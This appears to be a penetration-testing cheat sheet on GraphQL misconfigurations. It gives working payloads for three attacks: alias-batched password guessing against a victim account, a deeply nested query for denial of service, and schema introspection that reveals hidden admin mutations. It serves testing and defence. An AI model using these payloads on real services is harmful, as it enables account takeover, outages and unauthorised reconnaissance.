# GraphQL Misconfiguration

## Table of Contents

- [Account Takeover](#account-takeover)
- [Denial of Service](#denial-of-service)
- [Information Disclosure](#information-disclosure)

## Account Takeover

### Many passwords or one-time codes can be tried in a single HTTP request, so rate limits that count requests do not apply. [^1]

- Batching login attempts with aliases
    ```graphql
    mutation {
        a1: login(username: "victim", password: "123456") { token }
        a2: login(username: "victim", password: "password") { token }
        a3: login(username: "victim", password: "qwerty") { token }
    }
    ```
    A single request can carry hundreds of aliases. The resulting impacts are described in [Lack of Rate Limit](./Lack_of_Rate_Limit.md).

## Denial of Service

### A single small query can make the server resolve an exponential number of objects. [^2]

- Nesting circular relationships
    ```graphql
    query {
        user(id: "1") {
            friends {
                friends {
                    friends {
                        friends {
                            friends {
                                name
                            }
                        }
                    }
                }
            }
        }
    }
    ```
    Each level multiplies the number of objects to resolve, so adding levels grows the work exponentially while the request stays small.

## Information Disclosure

### The full schema, including operations hidden from the user interface, can be retrieved.

- Querying the schema through introspection
    ```graphql
    query {
        __schema {
            mutationType {
                fields {
                    name
                }
            }
        }
    }
    ```
    ```json
    {"data": {"__schema": {"mutationType": {"fields": [{"name": "login"}, {"name": "updateProfile"}, {"name": "adminDeleteUser"}, {"name": "internalSetBalance"}]}}}}
    ```
    Operations that the front-end never calls, and that may lack authorization checks, are revealed.

[^1]: Applies when rate limiting counts HTTP requests rather than the operations within them.
[^2]: Applies when the service does not limit query depth or cost.
